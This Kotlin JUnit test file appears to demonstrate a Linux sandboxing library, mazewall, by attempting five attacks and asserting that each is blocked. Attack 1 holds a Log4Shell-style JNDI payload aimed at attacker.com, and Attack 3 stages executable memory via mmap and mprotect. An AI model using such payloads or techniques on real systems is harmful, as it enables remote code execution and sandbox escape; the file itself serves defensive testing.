package demo

import io.mazewall.Arch
import io.mazewall.LinuxNative
import io.mazewall.Policy
import io.mazewall.enforcer.ContainedExecutors
import io.mazewall.enforcer.ContainmentViolationException
import org.junit.jupiter.api.Test
import java.io.File
import java.lang.foreign.*
import java.util.concurrent.ExecutionException
import java.util.concurrent.Executors
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class ProtectionDemonstrationTest {
    @Test
    fun `Attack 1 - Classic Shell Execution Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.Platform.isSupported()) return

        val marker = File("/tmp/pwned_safe")
        marker.delete()

        val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"

        val ex =
            assertFailsWith<ContainmentViolationException> {
                SafeRunner.run(payload)
            }

        assertTrue(
            ex.message!!.contains("containment", ignoreCase = true),
            "Expected containment violation message, got: ${ex.message}",
        )

        assertFalse(marker.exists(), "Exploit marker should NOT exist")
    }

    @Test
    fun `Attack 2 - Fileless Payload Creation Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.NO_EXEC)

        try {
            safeExecutor
                .submit {
                    val arch = Arch.current()
                    Arena.ofConfined().use { arena ->
                        val name = arena.allocateFrom("test_memfd_protected")
                        val res =
                            LinuxNative.syscall(
                                arch.memfdCreate.toLong(),
                                name.address(),
                                0L,
                            )
                        assertTrue(res.returnValue < 0, "memfd_create should be blocked by NO_EXEC")
                        assertTrue(res.errno == LinuxNative.EPERM, "Expected EPERM, got ${res.errno}")
                    }
                }.get()
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }

    @Test
    fun `Attack 3 - Shellcode and Memory Pivoting Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.builder().build())

        try {
            assertFailsWith<ExecutionException> {
                safeExecutor
                    .submit {
                        val linker = Linker.nativeLinker()
                        val mmap =
                            linker.downcallHandle(
                                linker.defaultLookup().find("mmap").get(),
                                FunctionDescriptor.of(
                                    ValueLayout.ADDRESS,
                                    ValueLayout.ADDRESS,
                                    ValueLayout.JAVA_LONG,
                                    ValueLayout.JAVA_INT,
                                    ValueLayout.JAVA_INT,
                                    ValueLayout.JAVA_INT,
                                    ValueLayout.JAVA_LONG,
                                ),
                            )
                        val mprotect =
                            linker.downcallHandle(
                                linker.defaultLookup().find("mprotect").get(),
                                FunctionDescriptor.of(
                                    ValueLayout.JAVA_INT,
                                    ValueLayout.ADDRESS,
                                    ValueLayout.JAVA_LONG,
                                    ValueLayout.JAVA_INT,
                                ),
                            )

                        val PROT_READ = 0x1
                        val PROT_WRITE = 0x2
                        val PROT_EXEC = 0x4
                        val MAP_PRIVATE = 0x02
                        val MAP_ANONYMOUS = 0x20

                        val addr =
                            mmap.invoke(
                                MemorySegment.NULL,
                                4096L,
                                PROT_READ or PROT_WRITE,
                                MAP_PRIVATE or MAP_ANONYMOUS,
                                -1,
                                0L,
                            ) as MemorySegment
                        if (addr.address() == -1L) throw java.io.IOException("mmap failed")

                        val res = mprotect.invoke(addr, 4096L, PROT_READ or PROT_EXEC) as Int
                        if (res == -1) {
                            throw java.io.IOException("Operation not permitted")
                        }
                    }.get()
            }.let { e ->
                assertTrue(
                    e.cause is ContainmentViolationException,
                    "Expected ContainmentViolationException as cause, but got ${e.cause}",
                )
            }
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }

    @Test
    fun `Attack 4 - Path Traversal Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        // PURE_COMPUTE includes PURE_COMPUTE_UNSAFE and blocks OPENAT, and automatically enables Landlock
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.PURE_COMPUTE)

        try {
            assertFailsWith<ExecutionException> {
                safeExecutor
                    .submit {
                        File("/etc/hosts").readText()
                    }.get()
            }.let { e ->
                assertTrue(
                    e.cause is ContainmentViolationException,
                    "Expected ContainmentViolationException as cause, but got ${e.cause}",
                )
            }
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }

    @Test
    fun `Attack 5 - io_uring Async Evasion Protected`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.mazewall.Platform.isSupported()) return

        val executor = Executors.newSingleThreadExecutor()
        // PURE_COMPUTE uses PURE_COMPUTE_UNSAFE and automatically enables Landlock
        val safeExecutor = ContainedExecutors.wrap(executor, Policy.PURE_COMPUTE)

        try {
            safeExecutor
                .submit {
                    Arena.ofConfined().use { arena ->
                        val openResult =
                            LinuxNative.open(
                                arena.allocateFrom("/etc/hosts"),
                                0, // O_RDONLY
                            )
                        // If Landlock restricts the path, open returns -1 and errno is EACCES (13)
                        assertTrue(openResult.returnValue < 0, "open of /etc/hosts should fail under Landlock")
                        assertTrue(
                            openResult.errno == 1 || openResult.errno == 13,
                            "Expected EPERM (1) or EACCES (13), got: ${openResult.errno}",
                        )
                    }
                }.get()
        } finally {
            safeExecutor.shutdown()
            executor.shutdown()
        }
    }
}
